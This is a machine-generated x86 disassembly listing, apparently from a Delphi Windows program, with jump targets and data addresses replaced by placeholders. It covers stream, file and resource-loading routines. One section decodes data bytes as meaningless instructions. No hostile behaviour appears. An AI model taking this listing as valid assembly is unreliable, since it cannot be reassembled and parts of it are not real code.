mov eax [ r-xdata ]
call sub_40c05c
call sub_403e8c
sub_418b44
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0xc ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c05c
call sub_403e8c
sub_418b7c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0xf000
jbe r-xdata
push 0x0
push 0x0
mov eax edi
call sub_418900
mov eax edi
call sub_418914
mov [ ebp + 0x8 ] eax
mov [ ebp + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x14 ] 0xf000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_402744
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_418c59
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x14 ]
cdq
cmp edx [ ebp + 0xc ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jge r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418c60
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_402764
retn
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp - 0x14 ]
jmp r-xdata
jmp r-xdata
mov esi [ ebp - 0x18 ]
mov edx esi
mov ecx ebx
mov eax edi
call sub_418b0c
mov edx esi
mov ecx ebx
mov eax [ ebp - 0x4 ]
call sub_418b44
mov eax ebx
cdq
sub [ ebp + 0x8 ] eax
sbb [ ebp + 0xc ] edx
sub_418c70
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
push 0x1000
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_419298
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_418cc0
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_41b0c0
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418cc7
mov eax [ ebp - 0x8 ]
call sub_4036c0
retn
sub_418cdc
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
push 0x1000
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_419298
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_418d2c
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41c7c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418d33
mov eax [ ebp - 0x4 ]
call sub_4036c0
retn
sub_418d38
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403690
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_418d94
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
and edx 0x7f
mov eax [ eax + 0x4 ]
call sub_408d64
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn 0x8
sub_418dd4
push ebp
mov ebp esp
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebx + 0x4 ]
push eax
call SetEndOfFile
call sub_40d38c
pop ebx
pop ebp
retn 0x8
sub_418dfc
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov ax [ ebp + 0x8 ]
push eax
push 0x0
xor edx edx
mov eax esi
call sub_418e40
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_418e40
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0xc ]
cmp di 0xffff
jne r-xdata
add esp 0xfffffff0
call sub_403a24
movzx edx di
mov eax esi
call sub_408c84
mov ecx eax
xor edx edx
mov eax ebx
call sub_418d38
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
mov edx [ ebp + 0x8 ]
mov eax esi
call sub_408d04
mov ecx eax
xor edx edx
mov eax ebx
call sub_418d38
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c098
call sub_403e8c
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c098
call sub_403e8c
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_418f08
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
jl r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4036b0
test bl bl
jle r-xdata
call sub_408d9c
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_418f44
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
jl r-xdata
xor esi esi
test ecx ecx
jl r-xdata
mov esi [ ebx + 0x8 ]
sub esi edi
test esi esi
jle r-xdata
cmp ecx esi
jge r-xdata
mov eax [ ebx + 0x4 ]
add eax edi
mov ecx esi
call sub_4028fc
add [ ebx + 0xc ] esi
jmp r-xdata
mov esi ecx
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_418f7c
sub cx 0x1
jb r-xdata
mov [ eax + 0xc ] edx
jmp r-xdata
je r-xdata
mov eax [ eax + 0xc ]
retn
add [ eax + 0xc ] edx
jmp r-xdata
dec cx
je r-xdata
add edx [ eax + 0x8 ]
mov [ eax + 0xc ] edx
jmp r-xdata
sub_418fa0
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov eax esi
call sub_418fcc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4036b0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_418fe4
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov edx eax
mov ecx [ ebx + 0x8 ]
mov eax ebx
call sub_418f3c
mov eax [ esp ]
mov [ ebx + 0x10 ] eax
pop edx
pop ebx
retn
sub_41900c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
mov edx esi
mov eax ebx
call sub_418fe4
mov [ ebx + 0x8 ] esi
cmp esi edi
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_419038
push ebx
push esi
push edi
cmp [ edx ] 0x0
jle r-xdata
mov esi [ eax + 0x4 ]
mov ecx esi
mov edi [ edx ]
mov ebx [ eax + 0x10 ]
cmp edi ebx
je r-xdata
mov ecx [ edx ]
cmp ecx [ eax + 0x8 ]
je r-xdata
mov eax ecx
pop edi
pop esi
pop ebx
retn
cmp [ edx ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx 0x1fff
and ecx 0xffffe000
mov [ edx ] ecx
test ebx ebx
jne r-xdata
mov eax esi
call sub_407474
xor ecx ecx
jmp r-xdata
mov ecx [ rw-data ]
movzx ecx [ ecx ]
mov edx [ edx ]
mov eax esi
call sub_407458
mov ecx eax
mov eax [ rw-data ]
movzx eax [ eax ]
mov edx [ edx ]
call sub_407448
mov ecx eax
jmp r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c05c
call sub_403e8c
test ecx ecx
jne r-xdata
sub_4190c4
push ebx
push esi
push edi
push ebp
mov esi ecx
mov ebp edx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
jl r-xdata
xor eax eax
test esi esi
jl r-xdata
mov edi eax
add edi esi
test edi edi
jle r-xdata
cmp edi [ ebx + 0x8 ]
jle r-xdata
mov edx [ ebx + 0x4 ]
add edx [ ebx + 0xc ]
mov eax ebp
mov ecx esi
call sub_4028fc
mov [ ebx + 0xc ] edi
mov eax esi
jmp r-xdata
cmp edi [ ebx + 0x10 ]
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] edi
mov edx edi
mov eax ebx
call sub_418fe4
sub_419114
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403690
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
call sub_4048dc
mov ecx eax
mov edx esi
mov eax edi
call sub_4191dc
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_41916c
push ebp
mov ebp esp
add esp 0xfffffff4
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4191cf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x6
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_406660
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bfdc
call sub_403e8c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4191d6
lea eax [ ebp - 0xc ]
call sub_40442c
retn
sub_4191dc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push esi
call FindResourceA
mov edi eax
mov [ ebx + 0x10 ] edi
test edi edi
jne r-xdata
mov eax [ ebx + 0x10 ]
push eax
push esi
call LoadResource
mov edi eax
mov [ ebx + 0x14 ] edi
test edi edi
jne r-xdata
push ebp
call sub_41916c
pop ecx
mov eax [ ebx + 0x10 ]
push eax
push esi
call SizeofResource
push eax
mov eax [ ebx + 0x14 ]
push eax
call LockResource
mov edx eax
mov eax ebx
pop ecx
call sub_418f3c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
push ebp
call sub_41916c
pop ecx
sub_419248
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_407444
mov eax [ esi + 0x14 ]
push eax
call FreeResource
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4036b0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_419298
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
mov esi [ ebp + 0x8 ]
mov [ edi + 0x4 ] ecx
mov eax esi
call sub_402744
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_4192e0
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
test bl bl
jle r-xdata
mov edx [ esi + 0xc ]
call sub_402764
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_419310
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
xchg ebx eax
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x6d ] dh
inc ecx
add [ eax ] bl
add [ eax ] al
add al bl
adc [ eax ] al
or [ ecx ] bh
inc eax
add [ ecx + edi ] dl
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax - 0x7bffbfca ] dh
xchg esp eax
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x100040 ] ch
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
adc al 0x0
add [ eax ] al
or dl [ eax + edx * 2 + 0x72 ]
outsd
jo r-xdata
add [ eax + 0x36 ] bl
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax - 0x6bffbfca ] dh
xchg esp eax
inc ecx
add [ esi ] cl
push esp
push eax
jb r-xdata
imul edi [ eax + 0x75 ] r-xdata
rcl [ ebx + 0x41 ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0x93
inc ecx
add [ eax ] bl
add [ eax ] al
add [ ebx + edx * 4 ] cl
inc ecx
add [ eax ] cl
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
fsubp st3
add [ ebx - 0x76 ] eax
adc eax [ edx + edx * 8 - 0x157ffa8c ]
r-xdata
jo r-xdata
inc ebx
cmp [ ebx ] 0x0
je r-xdata
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
outsb
je r-xdata
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_40451c
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_40497c
mov al 0x1
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
inc esi
imul edi [ eax + 0x75 ] 0x8b559070
in al dx
push ebx
push esi
test dl dl
je r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_404480
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_404480
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
sub_4193e4
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_404480
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_404480
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_41943c
push ebx
push esi
push edi
push ebp
mov edi eax
xor eax eax
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_40451c
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_40497c
mov al 0x1
inc ebx
sub_419494
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41950b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_406194
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_413200
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419512
lea eax [ ebp - 0x4 ]
call sub_406194
retn
mov eax [ ebx + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
call sub_41252c
add eax 0x5
push eax
lea eax [ ebp - 0x4 ]
call sub_406194
mov ecx eax
mov eax esi
pop edx
call sub_40daf0
test al al
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_406194
sub_419518
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4195be
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4195c5
lea eax [ ebp - 0x8 ]
call sub_40442c
retn
mov edi esi
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_40451c
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_41e6ac
mov esi eax
test esi esi
jne r-xdata
add dl 0xd3
sub dl 0x2
jae r-xdata
test esi esi
je r-xdata
mov edx r-xdata
mov eax [ ebp - 0x8 ]
call sub_40873c
test al al
je r-xdata
inc ebx
cmp [ ebx ] 0x2e
jne r-xdata
mov esi edi
cmp [ ebx ] 0x2d
jne r-xdata
inc ebx
cmp [ ebx ] 0x3e
jne r-xdata
inc ebx
mov edi esi
inc ebx
sub_4195e0
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_4161fc
test eax eax
jge r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_4161fc
test eax eax
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_416044
sub_419618
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_4161fc
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_4161fc
test eax eax
jge r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
xchg edx eax
call sub_416090
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_416044
sub_419660
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_40d7e4
xor edx edx
push ebp
push sub_4197f9
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
call sub_416834
mov edi eax
xor edx edx
push ebp
push sub_4197da
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ edi + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4197e1
mov eax [ rw-data ]
call sub_416898
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_4197bb
push [ fs : edx ]
mov [ fs : edx ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_419769
push [ fs : edx ]
mov [ fs : edx ] esp
xor esi esi
jmp r-xdata
cmp esi [ edi + 0x8 ]
jl r-xdata
mov edx esi
mov eax edi
call sub_4161a0
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_415b5c
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419770
mov eax [ ebp - 0x8 ]
call sub_4036c0
retn
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_4127d0
test eax eax
je r-xdata
push ebp
mov eax [ ebx + 0x4 ]
call sub_4195e0
pop ecx
mov edx esi
mov eax edi
call sub_416090
mov eax ebx
call sub_4036c0
jmp r-xdata
mov edx [ ebx + 0x14 ]
mov eax [ ebp - 0xc ]
call sub_419518
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
push ebp
mov eax [ ebx + 0x4 ]
call sub_419618
pop ecx
inc esi
sub_419770
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4036c0
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
and [ edi + 0x1c ] 0xff7f
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4161a0
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
sub_419808
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_416834
mov edi eax
xor eax eax
push ebp
push sub_4198a3
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_416898
retn
mov edx ebx
mov eax edi
call sub_4161a0
mov esi eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edx ebx
mov eax edi
call sub_416090
mov eax esi
call sub_4036c0
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_40873c
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_4198b4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_416834
mov edi eax
xor eax eax
push ebp
push sub_41992b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_416898
retn
mov edx ebx
mov eax edi
call sub_4161a0
mov esi eax
mov eax [ esi + 0x4 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax edi
call sub_416090
mov eax esi
call sub_4036c0
sub_41995c
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] ebx
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c098
call sub_403e8c
pop ecx
pop edx
pop ebx
retn
sub_419988
push ebx
push esi
push edi
call sub_403a8c
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
sub edx [ esi + 0x14 ]
mov eax [ esi + 0x4 ]
mov cx 0x1
mov edi [ eax ]
call [ edi + 0x10 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4192e0
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_4199c4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_41b6a8
cmp bl al
je r-xdata
pop esi
pop ebx
retn
dec [ esi + 0x10 ]
mov eax esi
call sub_41b7b8
call sub_419950
sub_4199e8
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_40873c
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
lea eax [ ebx + 0x70 ]
call sub_40442c
sub_419a1c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_40873c
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41b6a8
cmp al 0xa
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_419adc
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_419e60
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx ]
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_419e60
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419ae3
mov eax [ ebp - 0x8 ]
call sub_4036c0
retn
mov eax [ ebp - 0x4 ]
dec [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_41b7b8
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
call sub_419950
sub_419b0c
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x5a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
sub_419b2c
push ebx
push esi
push edi
add esp 0xfffffef8
mov esi ecx
mov edi edx
mov ebx eax
lea eax [ esp + 0x8 ]
mov edx esi
mov ecx 0xff
call sub_4046c0
lea edx [ esp + 0x8 ]
mov eax [ edi ]
call sub_403944
mov [ esp ] eax
cmp [ esp ] 0x0
sete [ esp + 0x4 ]
cmp [ ebx + 0x3a ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
push esp
lea eax [ esp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
mov eax [ esp ]
add esp 0x108
pop edi
pop esi
pop ebx
retn
call sub_419950
sub_419b94
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ rw-data ]
call sub_416834
mov esi eax
xor edx edx
push ebp
push sub_419c04
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419c0b
mov eax [ rw-data ]
call sub_416898
retn
mov edx ebx
mov eax esi
call sub_4161a0
mov edx [ eax + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ eax + 0xc ]
cmp edx [ edi + 0xc ]
jne r-xdata
call sub_4036c0
mov edx ebx
